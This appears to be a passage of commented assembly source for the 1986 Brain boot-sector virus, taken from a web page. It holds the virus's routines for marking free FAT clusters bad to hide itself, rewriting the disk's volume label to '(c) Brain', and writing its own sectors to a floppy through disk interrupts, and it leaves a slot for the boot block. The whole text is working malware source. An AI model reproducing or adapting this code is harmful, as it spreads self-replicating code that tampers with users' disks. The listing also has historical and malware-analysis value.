                jmp     short delvedeeper
                nop
FATManipreadcounter dw      3
                db      ' (c) 1986 Brain & Amjads (pvt) Ltd'
delvedeeper:
                call    readFAT                 ; Get FAT ID byte
                mov     ax,word ptr ds:[offset readbuffer]
                cmp     ax,0FFFDh               ; is it 360K disk?
                je      is360Kdisk              ; continue if so
                mov     al,3                    ; al=3 == not good disk
                stc                             ; flag error
                retn                            ; and exit
is360Kdisk:
                mov     cx,37h
                mov     FATManipreadcounter,0   ; none found yet
checknextsector:
                call    FATentry12bit           ; get entry in FAT
                cmp     ax,0                    ; unused?
                jne     notunused
                inc     FATManipreadcounter     ; one more found unused
                cmp     FATManipreadcounter,3   ; If need more,
                jne     tryanother              ;  go there
                jmp     short markembad         ; found 3 consecutive
                nop                             ; empty sectors
notunused:
                mov     FATManipreadcounter,0   ; must start over
tryanother:
                inc     cx                      ; try next sector
                cmp     cx,163h                 ; end of disk?
                jne     checknextsector         ; if not, continue
                mov     al,1                    ; al=1 == none empty
                stc                             ; Indicate error
                retn
markembad:
                mov     dl,3                    ; 3 times
markanotherbad:
                call    markbad12bit
                dec     cx
                dec     dl
                jnz     markanotherbad
                inc     cx
                call    calc1sttrack
                call    writeFAT                ; update FAT
                mov     al,0                    ; al=0 == ok
                clc                             ; indicate success
                retn

markbad12bit:
                push    cx
                push    dx
                mov     si,offset readbuffer    ; si -> buffer
                mov     al,cl
                shr     al,1
                jc      low_12                  ; low bits
                call    clus2offset12bit
                mov     ax,[bx+si]              ; get FAT entry
                and     ax,0F000h               ; mark it bad
                or      ax,0FF7h
                jmp     short putitback         ; and put it back
                nop
low_12:
                call    clus2offset12bit
                mov     ax,[bx+si]              ; get FAT entry
                and     ax,0Fh                  ; mark it bad
                or      ax,0FF70h
putitback:
                mov     [bx+si],ax              ; replace FAT entry
                mov     word ptr ds:[400h][bx+si],ax ; in two places
                pop     dx
                pop     cx
                retn

FATentry12bit:
                push    cx
                mov     si,offset readbuffer    ; si->buffer
                mov     al,cl
                shr     al,1
; Part 3 of the virus starts here
                jc      want_high_12
                call    clus2offset12bit
                mov     ax,[bx+si]
                and     ax,0FFFh
                jmp     short exitFATentry12bit
                nop
want_high_12:
                call    clus2offset12bit        ; xxxxxxxxxxxx0000
                mov     ax,[bx+si]              ; ^^^^^^^^^^^^wanted
                and     ax,0FFF0h               ; mask wanted bits
                mov     cl,4                    ; and move to correct
                shr     ax,cl                   ; position
exitFATentry12bit:
                pop     cx
                retn

clus2offset12bit:
                push    dx
                mov     ax,3
                mul     cx
                shr     ax,1                    ; ax = cx*1.5
                mov     bx,ax
                pop     dx
                retn

readFAT:
                mov     ah,2                    ; read
                call    FAT_IO
                retn

writeFAT:
                mov     ah,3                    ; write
                call    FAT_IO
                retn

FAT_IO:
                mov     cx,4                    ; try four times
FAT_IOLoop:
                push    cx
                push    ax
                mov     ah,0                    ; reset disk
                int     6Dh                     ; int 13h
                pop     ax
                jc      tryFAT_IOagain
                mov     bx,offset readbuffer
                mov     al,4                    ; 4 sectors
                mov     dh,0                    ; head 0
                mov     dl,curdrive
                mov     cx,2                    ; sector 2
                push    ax                      ; (FAT)
                int     6Dh                     ; int 13h
                pop     ax
                jnc     exitFAT_IO
tryFAT_IOagain:
                pop     cx
                loop    FAT_IOLoop

                pop     ax
                pop     ax
                mov     al,2
                stc                             ; mark error
                retn
exitFAT_IO:
                pop     cx
                retn

calc1sttrack:
                push    cx
                sub     cx,2
                shl     cx,1                    ; 2 sectors/cluster
                add     cx,0Ch                  ; start of data area
                mov     ax,cx                   ; ax = sector
                mov     cl,12h                  ; 4096
                div     cl                      ; ax/4096 = al rem ah
                mov     byte ptr firstsector+1,al
                mov     firsthead,0
                inc     ah
                cmp     ah,9                    ; past track 9?
                jbe     notpasttrack9           ; nope, we are ok
                sub     ah,9                    ; otherwise, adjust
                mov     firsthead,1
notpasttrack9:
                mov     byte ptr firstsector,ah
                pop     cx
                retn

                db      0, 0, 0, 0, 0, 0
r_or_w_root     db      3
entrycount      dw      35h

tempsave1       dw      303h
tempsave2       dw      0EBEh
tempsave3       dw      1
tempsave4       dw      100h
                db      0E0h,0D8h, 9Dh,0D7h,0E0h, 9Fh
                db       8Dh, 98h, 9Fh, 8Eh,0E0h
                db      ' (c) ashar $'
changeroot:
                call    readroot                ; read in root directory
                jc      donotchangeroot
                push    di
                call    changevolume            ; change volume label
                pop     di
                jc      donotchangeroot
                call    writeroot               ; write back new root dir
donotchangeroot:
                retn
; The following is just garbage bytes
                db      0BBh, 9Bh, 04h,0B9h, 0Bh
                db      0,8Ah,7,0F6h,0D8h,88h,4,46h,43h
                db      0E2h,0F6h,0B0h,8,88h,4,0F8h,0C3h
                db      0C6h, 06h

changevolume:
                mov     entrycount,6Ch
                mov     si,offset readbuffer+40h; 3nd dir entry
                mov     tempsave1,dx
                mov     ax,entrycount           ; 6Ch
                shr     ax,1
                mov     tempsave3,ax            ; 36h
                shr     ax,1
                mov     tempsave2,ax            ; 1Bh
                xchg    ax,cx
                and     cl,43h                  ; cx = 3
                mov     di,tempsave2
                add     di,1E3h                 ; di = 01FE
findlabel:
                mov     al,[si]
                cmp     al,0
                je      dolabel                 ; no mo entries
                mov     al,[si+0Bh]             ; attribute byte
                and     al,8                    ; volume label?
                cmp     al,8                    ; yes?
                je      dolabel                 ; then change it!
                add     si,20h                  ; go to next directory entry
                dec     entrycount
                jnz     findlabel               ; loop back
                stc                             ; Error!
                retn
                db      8Bh
dolabel:
                mov     bx,[di]                 ; offset a_data
                xor     bx,tempsave3            ; bx = 53Ah
                mov     tempsave3,si            ; si->direntry
                cli
                mov     ax,ss
                mov     tempsave1,ax
                mov     tempsave2,sp
                mov     ax,cs
                mov     ss,ax
                mov     sp,tempsave3
                add     sp,0Ch                  ;->reserved area
                mov     cl,51h
                add     dx,444Ch
                mov     di,2555h
                mov     cx,0C03h
                repe    cmpsw
                mov     ax,0B46h
                mov     cx,3
                rol     ax,cl                   ; ax = 5A30h
                mov     tempsave3,ax
                mov     cx,5
                mov     dx,8
                sub     tempsave3,5210h         ; 820h
                push    tempsave3               ; store attributes/reserved
; I haven't commented the remainder of this procedure.
; It basically changes the volume label to read "(c) Brain"

; Comment mode OFF

dowhatever:
                mov     ah,[bx]                 ; 5a3h
                inc     bx
                mov     dl,ah
                shl     dl,1
                jc      dowhatever
searchstuff:
                mov     dl,[bx]                 ; dl=C2h
                inc     bx                      ; bx=53Eh
                mov     al,dl
                shl     dl,1
                jc      searchstuff
                add     ax,1D1Dh
                push    ax
                inc     tempsave3
                db       73h, 01h               ; jnc $+3
                db      0EAh,0E2h,0E1h, 8Bh, 26h; jmp 268B:E1E2
                xchg    bp,ax
                add     al,0A1h
                xchg    bx,ax
                add     al,8Eh
                sar     bl,1
                add     dh,[bp+si]
                clc
                ret
                ;db       95h, 04h,0A1h, 93h, 04h, 8Eh
                ;db      0D0h,0FBh, 02h, 32h,0F8h,0C3h

; Comment mode ON

readroot:
                mov     r_or_w_root,2           ; set action code
                jmp     short do_rw_root        ; easier to do w/
                nop                             ; mov ah, 2
writeroot:
                mov     r_or_w_root,3
                jmp     short do_rw_root        ; this is somewhat useless
                nop
do_rw_root:
                mov     dh,0                    ; head 0
                mov     dl,curdrive
                mov     cx,6                    ; sector 6
                mov     ah,r_or_w_root
                mov     al,4                    ; 4 sectors
                mov     bx,offset readbuffer
                call    doint13h
                jc      exit_rw_root            ; quit on error
                mov     cx,1
                mov     dh,1                    ; head 1
                mov     ah,r_or_w_root
                mov     al,3
                add     bx,800h
                call    doint13h

exit_rw_root:
                retn

doint13h:
                mov     tempsave1,ax
                mov     tempsave2,bx
                mov     tempsave3,cx
                mov     tempsave4,dx
                mov     cx,4

doint13hloop:
                push    cx
                mov     ah,0                    ; Reset disk
                int     6Dh
                jc      errordoingint13h
                mov     ax,tempsave1
                mov     bx,tempsave2
                mov     cx,tempsave3
                mov     dx,tempsave4
                int     6Dh                     ; int 13h
                jnc     int13hsuccess
errordoingint13h:
                pop     cx
                loop    doint13hloop

                stc                             ; indicate error
                retn
int13hsuccess:
                pop     cx
                retn

                db      0, 0, 0
; Part 4 of the virus starts here
tempstorecx     dw      3
readwritecurrentdata    dw      301h

writevirus:
                call    FATManip
                jc      exitwritevirus
                mov     cursector,1
                mov     curhead,0
                mov     bx,offset readbuffer
                call    readcurrent
                mov     bx,offset readbuffer
                mov     ax,firstsector
                mov     cursector,ax
                mov     ah,firsthead
                mov     curhead,ah
                call    writecurrent
                call    calcnextsector
                mov     cx,5
                mov     bx,200h
writeanothersector:
                mov     tempstorecx,cx
                call    writecurrent
                call    calcnextsector
                add     bx,200h
                mov     cx,tempstorecx
                loop    writeanothersector

                mov     curhead,0
                mov     cursector,1
                mov     bx,0
                call    writecurrent
                clc                             ; indicate success
exitwritevirus:
                retn


readcurrent:
                mov     readwritecurrentdata,201h
                jmp     short doreadwrite
                nop
writecurrent:
                mov     readwritecurrentdata,301h
                jmp     short doreadwrite       ; This is pointless.
                nop
doreadwrite:
                push    bx
                mov     cx,4

tryreadwriteagain:
                push    cx
                mov     dh,curhead
                mov     dl,curdrive
                mov     cx,cursector
                mov     ax,readwritecurrentdata ; read or write?
                int     6Dh                     ; int 13h
                jnc     readwritesuccessful
                mov     ah,0                    ; reset disk
                int     6Dh                     ; int 13h
                pop     cx
                loop    tryreadwriteagain

                pop     bx
                pop     bx
                stc                             ; Indicate error
                retn
readwritesuccessful:
                pop     cx
                pop     bx
                retn


calcnextsector:
                inc     byte ptr cursector      ; next sector
                cmp     byte ptr cursector,0Ah
                jne     donecalculate           ; finished calculations
                mov     byte ptr cursector,1    ; clear sector #
                inc     curhead                 ; and go to next head
                cmp     curhead,2               ; if not too large,
                jne     donecalculate           ; we are done
                mov     curhead,0               ; otherwise clear head #
                inc     byte ptr cursector+1    ; and advance cylinder
donecalculate:
                retn

                db       64h, 74h, 61h

; read buffer starts here
; insert your favorite boot block below...
readbuffer:
brain           ends
                end

</textarea></td></tr></table></body></html>
